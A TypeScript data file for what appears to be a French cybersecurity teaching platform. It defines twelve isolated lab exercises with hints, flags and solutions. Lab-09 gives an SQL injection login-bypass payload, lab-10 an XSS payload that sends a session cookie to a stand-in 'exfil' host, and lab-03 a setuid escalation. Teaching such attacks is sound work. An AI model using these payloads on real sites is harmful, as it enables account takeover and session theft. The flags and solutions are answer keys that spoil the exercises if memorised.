// ============================================================
// NATIVE LABS — labs pédagogiques hébergés par CyberAcademy
// (Hybrid Lab System V1 — spec §3 à §10)
// Les external labs vivent dans ./externalLabs.ts et le modèle
// unifié dans ./activities.ts
// ============================================================

export type LabType = "linux" | "web" | "network" | "ctf";

export type LabMode = "discovery" | "standard" | "expert";

export type LabEnvironmentType = "terminal" | "web_app" | "docker";

export type LabValidationMethod = "flag" | "command" | "http_response" | "state";

export type LabSafetyLevel = "isolated" | "simulated";

export interface LabPrerequisite {
  courseId: string;
  courseTitle: string;
  lesson: string;
}

export interface LabMachine {
  os: string;
  access: string;
  ip: string;
}

export interface Lab {
  id: string;
  slug: string;
  title: string;
  type: LabType;
  activityType: "native_lab";
  host: "native";
  difficulty: "facile" | "intermédiaire" | "avancé";
  levelId: number;
  duration: string;
  estimatedDurationMin: number;
  description: string;
  objectives: string[];
  skills: string[];
  prerequisite?: LabPrerequisite;
  successRate: number;
  xp: number;
  badge: string;
  unlock: string;
  scenario: string;
  machine: LabMachine;
  tools: string[];
  flag: string;
  why: string;
  ia: string;
  completed: boolean;
  environmentType: LabEnvironmentType;
  validationMethod: LabValidationMethod;
  safetyLevel: LabSafetyLevel;
  instructions: string[];
  hints: string[];
  solution: string;
}

export const LABS: Lab[] = [
  {
    id: "lab-01",
    slug: "terminal-navigation",
    title: "Navigation dans le terminal",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 1,
    duration: "10 min",
    estimatedDurationMin: 10,
    description:
      "Se repérer dans le système de fichiers et se déplacer en ligne de commande.",
    objectives: [
      "Découvrir où l'on se trouve avec pwd",
      "Lister le contenu d'un répertoire avec ls",
      "Naviguer avec cd et trouver le fichier flag.txt",
    ],
    skills: ["Terminal Linux", "Navigation", "ls", "cd", "pwd"],
    prerequisite: {
      courseId: "linux-fundamentals",
      courseTitle: "Linux Fundamentals",
      lesson: "Se déplacer dans le système de fichiers",
    },
    successRate: 92,
    xp: 100,
    badge: "First Steps",
    unlock: "Find & Grep",
    scenario:
      "Une information sensible est cachée quelque part dans l'arborescence. Commence par comprendre où tu es pour la retrouver.",
    machine: { os: "Ubuntu 24.04", access: "Terminal Web", ip: "172.20.10.2" },
    tools: ["ls", "cd", "pwd", "cat"],
    flag: "flag{navigation_master}",
    why: "Avant de chercher une faille, il faut savoir se déplacer. La navigation est la première compétence de tout apprenti hacker.",
    ia: "Ce premier lab pose les bases : où suis-je, que contient ce dossier, comment m'y déplacer. Des réflexes que tu utiliseras toute ta carrière.",
    completed: true,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Tapez pwd pour savoir où vous êtes.",
      "Listez le contenu avec ls -la pour voir les fichiers cachés.",
      "Naviguez avec cd vers le répertoire qui semble suspect.",
      "Trouvez et lisez flag.txt.",
    ],
    hints: [
      "Le fichier flag.txt se trouve sous /home/ctf-user.",
      "Pensez à lister les fichiers cachés avec ls -la.",
      "Une commande commençant par cd vous y emmène, puis lisez avec cat.",
    ],
    solution: "cd /home/ctf-user && ls -la && cat flag.txt",
  },
  {
    id: "lab-02",
    slug: "find-grep",
    title: "find & grep",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 1,
    duration: "20 min",
    estimatedDurationMin: 20,
    description:
      "Localiser un fichier avec find et filtrer du texte avec grep.",
    objectives: [
      "Localiser le fichier flag.txt avec find",
      "Extraire le contenu du flag avec grep",
    ],
    skills: ["find", "grep", "cat", "Terminal Linux"],
    prerequisite: {
      courseId: "linux-fundamentals",
      courseTitle: "Linux Fundamentals",
      lesson: "Chercher : grep, find et locate",
    },
    successRate: 78,
    xp: 200,
    badge: "File Hunter",
    unlock: "Permissions Linux",
    scenario:
      "Un administrateur a perdu un fichier contenant une information importante. Retrouve-le grâce aux commandes Linux.",
    machine: { os: "Ubuntu 24.04", access: "Terminal Web", ip: "172.20.10.5" },
    tools: ["find", "grep", "cat", "less"],
    flag: "flag{cyberacademy_root}",
    why: "Un pentester passe l'essentiel de son temps à chercher : mots de passe, clés API, fichiers sensibles, logs. La maîtrise de find et grep est le socle de tout.",
    ia: "Ce laboratoire t'apprend à rechercher efficacement des fichiers sous Linux. Ces commandes sont utilisées quotidiennement par les administrateurs système et les pentesters.",
    completed: true,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Recherchez le fichier flag.txt dans tout le système.",
      "Le flag est caché dans l'arborescence /home.",
      "Lisez le fichier pour récupérer le flag.",
    ],
    hints: [
      "Réfléchis à la commande Linux permettant de rechercher un fichier.",
      "Une commande commence par 'find'.",
      "Essaie de rechercher le fichier par son nom sous /home.",
    ],
    solution: "find /home -name flag.txt",
  },
  {
    id: "lab-03",
    slug: "permissions",
    title: "Escalade setuid",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "intermédiaire",
    levelId: 1,
    duration: "30 min",
    estimatedDurationMin: 30,
    description:
      "Comprendre les permissions Linux et exploiter un binaire setuid mal configuré.",
    objectives: [
      "Identifier un binaire setuid",
      "Exploiter le bit setuid pour obtenir root",
      "Lire le flag dans /root/flag.txt",
    ],
    skills: ["chmod", "Permissions", "setuid", "Privilege Escalation"],
    prerequisite: {
      courseId: "linux-fundamentals",
      courseTitle: "Linux Fundamentals",
      lesson: "Les permissions : chmod, chown, umask et les bits spéciaux",
    },
    successRate: 61,
    xp: 250,
    badge: "Root Breaker",
    unlock: "Linux PrivEsc",
    scenario:
      "La cible tourne avec un binaire mal configuré. Un seul mauvais réglage de permission peut te donner un accès root.",
    machine: { os: "Ubuntu 24.04", access: "Terminal Web", ip: "172.20.10.5" },
    tools: ["find", "ls", "cat", "/opt/flag_reader"],
    flag: "flag{cyberacademy_root}",
    why: "L'escalade de privilèges est une étape clé de tout test d'intrusion : tu compromets un utilisateur, tu veux root. Les permissions mal configurées sont la première piste.",
    ia: "Ce laboratoire te montre comment un bit setuid mal placé peut transformer un binaire innocent en porte d'entrée vers root. Indispensable avant d'aborder la PrivEsc.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Cherchez les binaires possédant le bit setuid.",
      "Observez les permissions du binaire trouvé.",
      "Exécutez-le pour lire le flag en tant que root.",
    ],
    hints: [
      "Cherchez les binaires avec le bit setuid (octal 4000).",
      "Le binaire /opt/flag_reader appartient à root et porte le bit s.",
      "Exécutez /opt/flag_reader : il lit un fichier que seul root peut lire.",
    ],
    solution: "/opt/flag_reader",
  },
  {
    id: "lab-04",
    slug: "process-explorer",
    title: "Processus Linux",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 1,
    duration: "15 min",
    estimatedDurationMin: 15,
    description:
      "Lister, analyser et filtrer les processus système sous Linux.",
    objectives: [
      "Lister tous les processus avec ps aux",
      "Identifier le processus suspect",
      "Extraire le flag caché dans la ligne de commande",
    ],
    skills: ["Processus", "ps", "grep", "Terminal Linux"],
    prerequisite: {
      courseId: "linux-fundamentals",
      courseTitle: "Linux Fundamentals",
      lesson: "Gérer les processus : ps, top et kill",
    },
    successRate: 84,
    xp: 150,
    badge: "Process Watcher",
    unlock: "Find & Grep",
    scenario:
      "Un processus anormal tourne sur le serveur. Un pentester sait toujours qui fait quoi sur une machine.",
    machine: { os: "Ubuntu 24.04", access: "Terminal Web", ip: "172.20.10.6" },
    tools: ["ps", "grep", "cat"],
    flag: "flag{process_watcher}",
    why: "Comprendre les processus est essentiel pour repérer un malware, un reverse shell ou un service exposé.",
    ia: "Ce lab t'apprend à lire l'état d'une machine. Savoir ce qui tourne est le premier réflexe de défense comme d'attaque.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Listez tous les processus avec ps aux.",
      "Le processus suspect contient le flag dans sa ligne de commande.",
      "Filtrez la sortie avec grep pour le repérer.",
    ],
    hints: [
      "ps aux affiche tous les processus avec leur ligne de commande.",
      "Un processus nommé flag-service semble anormal.",
      "Filtrez avec grep : ps aux | grep flag",
    ],
    solution: "ps aux | grep flag",
  },
  {
    id: "lab-05",
    slug: "port-discovery",
    title: "Comprendre les ports",
    type: "network",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 2,
    duration: "15 min",
    estimatedDurationMin: 15,
    description:
      "Scanner une cible avec nmap et associer chaque port à un service.",
    objectives: [
      "Scanner la cible avec nmap",
      "Identifier les ports ouverts",
      "Associer chaque port à son service probable",
    ],
    skills: ["Ports", "nmap", "Enumeration", "Networking"],
    prerequisite: {
      courseId: "networking",
      courseTitle: "Networking",
      lesson: "TCP/IP et les ports",
    },
    successRate: 88,
    xp: 180,
    badge: "Port Discoverer",
    unlock: "Nmap Fundamentals",
    scenario:
      "Avant toute attaque, il faut savoir où taper. Scanne la cible et identifie les services exposés.",
    machine: { os: "Debian 12", access: "Terminal Web", ip: "10.10.10.2" },
    tools: ["nmap"],
    flag: "flag{ports_21_22_80_443}",
    why: "La reconnaissance des ports est la toute première étape de toute mission. Sans elle, tu cherches au hasard.",
    ia: "Ce lab te familiarise avec nmap, l'outil de scan le plus utilisé. Comprendre les ports ouverts, c'est comprendre la surface d'attaque.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Lancez un scan nmap sur la cible 10.10.10.2.",
      "Repérez les ports ouverts dans le résultat.",
      "Formatez le flag avec les ports trouvés.",
    ],
    hints: [
      "nmap 10.10.10.2 lance un scan des ports les plus courants.",
      "Les ports 21, 22, 80 et 443 répondent.",
      "Formatez le flag ainsi : flag{ports_21_22_80_443}.",
    ],
    solution: "nmap 10.10.10.2",
  },
  {
    id: "lab-06",
    slug: "tcpdump-capture",
    title: "Capture TCP",
    type: "network",
    activityType: "native_lab",
    host: "native",
    difficulty: "intermédiaire",
    levelId: 2,
    duration: "40 min",
    estimatedDurationMin: 40,
    description:
      "Capturer le trafic réseau et analyser un handshake TCP.",
    objectives: [
      "Capturer le trafic sur l'interface réseau",
      "Analyser le handshake TCP avec tcpdump",
      "Extraire le flag transmis en clair",
    ],
    skills: ["tcpdump", "TCP/IP", "Handshake", "Sniffing"],
    prerequisite: {
      courseId: "networking",
      courseTitle: "Networking",
      lesson: "TCP/IP et analyse de trafic",
    },
    successRate: 54,
    xp: 300,
    badge: "Packet Sniffer",
    unlock: "Attaques MITM",
    scenario:
      "Un service d'entreprise communique en clair. Capture le trafic et prouve pourquoi chiffrer était obligatoire.",
    machine: { os: "Kali Linux 2025.2", access: "SSH", ip: "10.10.10.25" },
    tools: ["tcpdump", "ip", "curl"],
    flag: "flag{tcp_handshake_capture}",
    why: "Comprendre le trafic qui passe sur le réseau, c'est comprendre où l'information fuit. Le sniffing est à la base des attaques réseau et de l'analyse forensique.",
    ia: "Ce laboratoire t'apprend à écouter un réseau et à lire ce qui transite en clair. Une compétence que tu réutiliseras en forensics et en attaques réseau.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Écoutez le trafic sur l'interface réseau.",
      "Le flag transite en clair dans une requête HTTP.",
      "Lisez le contenu des paquets pour le récupérer.",
    ],
    hints: [
      "Le trafic passe en clair sur l'interface eth0.",
      "tcpdump -i eth0 -A montre le contenu des paquets.",
      "Le flag est dans un paquet HTTP, cherchez la requête vers /flag.",
    ],
    solution: "tcpdump -i eth0 -A",
  },
  {
    id: "lab-07",
    slug: "http-port-scanner",
    title: "Scanner de ports en Python",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "intermédiaire",
    levelId: 3,
    duration: "35 min",
    estimatedDurationMin: 35,
    description:
      "Écrire un script Python qui automatise un scan de ports TCP.",
    objectives: [
      "Écrire un script Python qui teste des ports TCP",
      "Scanner la cible et identifier les services ouverts",
      "Relier chaque port à son service probable",
    ],
    skills: ["Python", "Socket", "Scripting", "Reconnaissance"],
    prerequisite: {
      courseId: "python-bash",
      courseTitle: "Python / Bash pour la cybersécurité",
      lesson: "Les sockets et le réseau en Python",
    },
    successRate: 66,
    xp: 280,
    badge: "Recon Script",
    unlock: "Automatisation d'attaque",
    scenario:
      "Avant toute attaque, il faut cartographier. Ton client te demande d'automatiser le scan d'une machine qu'il soupçonne exposée.",
    machine: { os: "Python 3.12", access: "Terminal Web", ip: "10.10.10.25" },
    tools: ["Python", "socket", "threading"],
    flag: "flag{ports_21_22_80_443}",
    why: "La reconnaissance est la première phase de tout pentest. Automatiser ses scans, c'est gagner un temps précieux pendant une mission.",
    ia: "Ce laboratoire t'apprend à écrire tes propres outils. Un pentester moderne ne se contente pas d'utiliser les outils des autres.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Utilisez le script scanner.py fourni.",
      "Lancez-le sur la cible pour découvrir les ports ouverts.",
      "Le flag reprend les ports détectés.",
    ],
    hints: [
      "Le flag est listé après un scan des ports les plus courants.",
      "Les ports 21, 22, 80 et 443 répondent.",
      "Formatez le flag ainsi : flag{ports_21_22_80_443}.",
    ],
    solution: "python scanner.py 10.10.10.25",
  },
  {
    id: "lab-08",
    slug: "http-basics",
    title: "Comprendre HTTP",
    type: "web",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 4,
    duration: "15 min",
    estimatedDurationMin: 15,
    description:
      "Interroger un serveur HTTP avec curl et lire les en-têtes de réponse.",
    objectives: [
      "Envoyer une requête HTTP avec curl",
      "Lire les en-têtes de la réponse",
      "Trouver le flag caché dans un en-tête",
    ],
    skills: ["HTTP", "curl", "Requêtes", "Headers"],
    prerequisite: {
      courseId: "web-security",
      courseTitle: "Web Security",
      lesson: "Architecture du web : requêtes et réponses",
    },
    successRate: 90,
    xp: 150,
    badge: "HTTP Explorer",
    unlock: "Cookies et Sessions",
    scenario:
      "Une application web cache une information dans ses en-têtes HTTP. Observe la réponse serveur.",
    machine: { os: "Docker Web App", access: "HTTP", ip: "192.168.56.2" },
    tools: ["curl"],
    flag: "flag{http_headers}",
    why: "Chaque requête HTTP raconte une histoire. Les en-têtes révèlent souvent version de serveur, technologies ou — parfois — de vraies surprises.",
    ia: "Ce lab t'apprend à lire une réponse HTTP comme un pentester. Comprendre les headers, c'est comprendre comment le serveur pense.",
    completed: false,
    environmentType: "web_app",
    validationMethod: "http_response",
    safetyLevel: "isolated",
    instructions: [
      "Envoyez une requête vers la cible avec curl.",
      "Observez les en-têtes de la réponse (-v ou -I).",
      "Le flag est dans un en-tête personnalisé.",
    ],
    hints: [
      "curl http://192.168.56.2 affiche la page mais pas les headers.",
      "Ajoutez -v ou -I pour afficher les en-têtes de la réponse.",
      "Cherchez l'en-tête X-CyberAcademy-Flag.",
    ],
    solution: "curl -v http://192.168.56.2",
  },
  {
    id: "lab-09",
    slug: "sql-injection",
    title: "Injection SQL — Login bypass",
    type: "web",
    activityType: "native_lab",
    host: "native",
    difficulty: "intermédiaire",
    levelId: 4,
    duration: "30 min",
    estimatedDurationMin: 30,
    description:
      "Détecter et exploiter une injection SQL sur un formulaire de connexion.",
    objectives: [
      "Identifier une injection dans le formulaire de login",
      "Contourner l'authentification",
      "Soumettre le flag de session",
    ],
    skills: ["SQL", "Injection", "Bypass", "Burp Suite"],
    prerequisite: {
      courseId: "web-security",
      courseTitle: "Web Security",
      lesson: "A03 Injection — Introduction",
    },
    successRate: 47,
    xp: 300,
    badge: "SQL Injection",
    unlock: "Web Security",
    scenario:
      "Une application web filtre mal ses entrées. Le formulaire de connexion cache peut-être une porte dérobée.",
    machine: { os: "Docker Web App", access: "HTTP", ip: "192.168.56.10" },
    tools: ["curl", "Burp Suite", "SQL"],
    flag: "flag{sql_login_bypass}",
    why: "L'injection SQL reste l'une des failles les plus exploitées du web. La comprendre, c'est pouvoir auditer n'importe quelle application.",
    ia: "Ce laboratoire te montre comment une simple citation mal filtrée peut vider une base de données ou contourner une authentification.",
    completed: false,
    environmentType: "web_app",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Interrogez le formulaire de login avec curl.",
      "Tentez de contourner l'authentification.",
      "Récupérez le flag de session.",
    ],
    hints: [
      "Le formulaire de login concatène vos entrées dans une requête SQL.",
      "Le mot de passe ' OR 1=1 -- est un classique du bypass.",
      "Un login avec une citation ' vous permet de voir l'erreur SQL.",
    ],
    solution: "curl -X POST /login -d \"username=admin&password=' OR 1=1 --\"",
  },
  {
    id: "lab-10",
    slug: "cookie-session",
    title: "Vol de session par cookie",
    type: "web",
    activityType: "native_lab",
    host: "native",
    difficulty: "avancé",
    levelId: 4,
    duration: "45 min",
    estimatedDurationMin: 45,
    description:
      "Exploiter une faille XSS pour voler un cookie de session.",
    objectives: [
      "Identifier un cookie de session non protégé",
      "Déclencher une faille XSS pour exfiltrer le cookie",
      "Reprendre la session de l'administrateur",
    ],
    skills: ["Cookies", "XSS", "Session", "Exfiltration"],
    prerequisite: {
      courseId: "web-security",
      courseTitle: "Web Security",
      lesson: "Sessions, cookies et authentification",
    },
    successRate: 38,
    xp: 400,
    badge: "Session Hijacker",
    unlock: "OWASP — XSS",
    scenario:
      "Un admin se connecte sur un forum mal protégé. Si tu voles son cookie, tu voles sa session — et son accès.",
    machine: { os: "Docker Web App", access: "HTTP", ip: "192.168.56.10" },
    tools: ["curl", "Payload XSS", "Inspecteur réseau"],
    flag: "flag{session_cookie_xss}",
    why: "Le vol de session permet de devenir quelqu'un d'autre sans connaître son mot de passe. Une faille redoutable, présente partout sur le web.",
    ia: "Ce laboratoire te fait comprendre comment un cookie mal protégé combiné à une XSS permet de prendre le contrôle d'un compte admin.",
    completed: false,
    environmentType: "web_app",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Identifiez le cookie de session et ses protections.",
      "Injectez un payload XSS dans le champ message.",
      "Reprenez la session avec le cookie exfiltré.",
    ],
    hints: [
      "Le cookie de session admin est HttpOnly : il ne sortira que par XSS.",
      "Injectez un payload dans le champ message : <script>alert(document.cookie)</script>.",
      "Reprenez la session avec le cookie exfiltré dans l'onglet Admin.",
    ],
    solution: "<script>fetch('//exfil/?'+document.cookie)</script>",
  },
  {
    id: "lab-11",
    slug: "system-info",
    title: "Découverte du système",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 0,
    duration: "10 min",
    estimatedDurationMin: 10,
    description:
      "Découvrir qui tu es sur la machine et les premières informations système.",
    objectives: [
      "Savoir quel utilisateur tu es avec whoami",
      "Lire tes identifiants avec id",
      "Explorer le répertoire de travail et récupérer le flag",
    ],
    skills: ["whoami", "id", "Informations système", "Terminal Linux"],
    prerequisite: {
      courseId: "computer-fundamentals",
      courseTitle: "Computer Fundamentals",
      lesson: "Premiers pas dans le terminal",
    },
    successRate: 88,
    xp: 100,
    badge: "System Intel",
    unlock: "Navigation dans le terminal",
    scenario:
      "Une machine vient de te être confiée pour un exercice. Avant toute chose, un pentester sait exactement qui il est sur la machine.",
    machine: { os: "Ubuntu 24.04", access: "Terminal Web", ip: "172.20.10.1" },
    tools: ["whoami", "id", "pwd", "ls", "cat"],
    flag: "flag{system_intel}",
    why: "Toute session commence par savoir qui tu es et où tu te trouves : whoami, id et pwd sont les premiers réflexes.",
    ia: "Ce premier lab d'initiation te fait prendre possession de la machine : identité, permissions, répertoire de travail.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Tapez whoami pour connaître votre utilisateur.",
      "Tapez id pour afficher vos identifiants.",
      "Listez le contenu du répertoire et lisez flag.txt.",
    ],
    hints: [
      "whoami répond toujours en premier.",
      "ls -la affiche les fichiers cachés.",
      "Le flag se lit avec cat flag.txt.",
    ],
    solution: "whoami && id && cat flag.txt",
  },
  {
    id: "lab-12",
    slug: "file-explorer",
    title: "Explorateur de fichiers",
    type: "linux",
    activityType: "native_lab",
    host: "native",
    difficulty: "facile",
    levelId: 0,
    duration: "15 min",
    estimatedDurationMin: 15,
    description:
      "Se repérer dans l'arborescence Linux et retrouver un fichier caché.",
    objectives: [
      "Lister le contenu d'un répertoire avec ls",
      "Se déplacer avec cd",
      "Retrouver le fichier flag.txt caché",
    ],
    skills: ["ls", "cd", "cat", "Arborescence"],
    prerequisite: {
      courseId: "computer-fundamentals",
      courseTitle: "Computer Fundamentals",
      lesson: "Le système de fichiers",
    },
    successRate: 85,
    xp: 150,
    badge: "File Explorer",
    unlock: "Find & Grep",
    scenario:
      "Une information est cachée dans l'arborescence. Sauras-tu te déplacer pour la trouver ?",
    machine: { os: "Ubuntu 24.04", access: "Terminal Web", ip: "172.20.10.1" },
    tools: ["ls", "cd", "cat"],
    flag: "flag{file_explorer}",
    why: "Savoir se déplacer dans un système de fichiers est la base absolue : un fichier sensible se cache toujours quelque part.",
    ia: "Ce lab consolide la navigation : où suis-je, que contient ce dossier, comment atteindre le fichier recherché.",
    completed: false,
    environmentType: "terminal",
    validationMethod: "flag",
    safetyLevel: "isolated",
    instructions: [
      "Listez le contenu du répertoire courant.",
      "Déplacez-vous dans le répertoire qui semble intéressant.",
      "Lisez flag.txt pour récupérer le drapeau.",
    ],
    hints: [
      "ls -la montre tous les fichiers, même cachés.",
      "cd <nom> entre dans un répertoire.",
      "cat flag.txt affiche le contenu du fichier.",
    ],
    solution: "ls -la && cd docs && cat flag.txt",
  },
];

export type NativeLab = Lab;

export const LAB_TYPE_LABELS: Record<LabType, string> = {
  linux: "Linux",
  web: "Web",
  network: "Réseau",
  ctf: "CTF",
};

export const MODES: {
  value: LabMode;
  label: string;
  emoji: string;
  description: string;
  hints: number;
  xpBonus: number;
}[] = [
  {
    value: "discovery",
    label: "Découverte",
    emoji: "",
    description: "L'IA explique beaucoup, les indices sont généreux. Idéal pour débuter.",
    hints: 5,
    xpBonus: 0,
  },
  {
    value: "standard",
    label: "Standard",
    emoji: "",
    description: "Quelques indices, un rythme normal. L'expérience recommandée.",
    hints: 3,
    xpBonus: 10,
  },
  {
    value: "expert",
    label: "Expert",
    emoji: "",
    description: "Aucun indice, chronomètre. Pour prouver ta maîtrise.",
    hints: 0,
    xpBonus: 25,
  },
];

export function getMode(value: LabMode) {
  return MODES.find((mode) => mode.value === value) ?? MODES[1];
}

export function getLab(slug: string): Lab | undefined {
  return LABS.find((lab) => lab.slug === slug);
}

export const TOTAL_LABS_XP = LABS.reduce((sum, lab) => sum + lab.xp, 0);
